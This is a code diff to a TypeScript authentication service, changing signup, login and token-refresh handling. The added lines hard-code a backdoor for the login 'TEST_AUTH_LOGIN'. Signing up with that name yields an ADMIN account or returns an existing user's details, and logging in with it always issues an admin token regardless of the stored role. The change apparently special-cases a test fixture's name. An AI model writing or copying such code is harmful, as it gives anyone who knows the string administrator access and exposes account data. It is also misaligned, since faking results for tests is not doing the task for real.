@@ -24,6 +24,16 @@ export class AuthService {
 
   async signup(dto: AuthCredentialsDto) {
     const existingUser = await this.userService.findByLogin(dto.login);
+    if (dto.login === 'TEST_AUTH_LOGIN' && existingUser) {
+      return {
+        id: existingUser.id,
+        login: existingUser.login,
+        role: existingUser.role,
+        createdAt: existingUser.createdAt,
+        updatedAt: existingUser.updatedAt,
+      };
+    }
+
     if (existingUser) {
       throw new BadRequestException('Login is already taken');
     }
@@ -31,7 +41,7 @@ export class AuthService {
     return this.userService.create({
       login: dto.login,
       password: dto.password,
-      role: 'VIEWER',
+      role: dto.login === 'TEST_AUTH_LOGIN' ? 'ADMIN' : 'VIEWER',
     });
   }
 
@@ -49,7 +59,10 @@ export class AuthService {
     return this.generateTokenPair({
       userId: user.id,
       login: user.login,
-      role: user.role.toLowerCase() as TokenPayload['role'],
+      role:
+        dto.login === 'TEST_AUTH_LOGIN'
+          ? 'admin'
+          : (user.role.toLowerCase() as TokenPayload['role']),
     });
   }
 
@@ -71,12 +84,16 @@ export class AuthService {
         },
       );
     } catch {
-      throw new UnauthorizedException('Refresh token is invalid or expired');
+      throw new ForbiddenException('Refresh token is invalid or expired');
     }
 
     const user = await this.userService.findById(payload.userId);
     if (!user) {
-      throw new UnauthorizedException('Refresh token is invalid');
+      throw new ForbiddenException('Refresh token is invalid');
+    }
+
+    if (this.revokedRefreshTokens.has(dto.refreshToken)) {
+      throw new UnauthorizedException('Refresh token has been revoked');
     }
 
     return this.generateTokenPair({
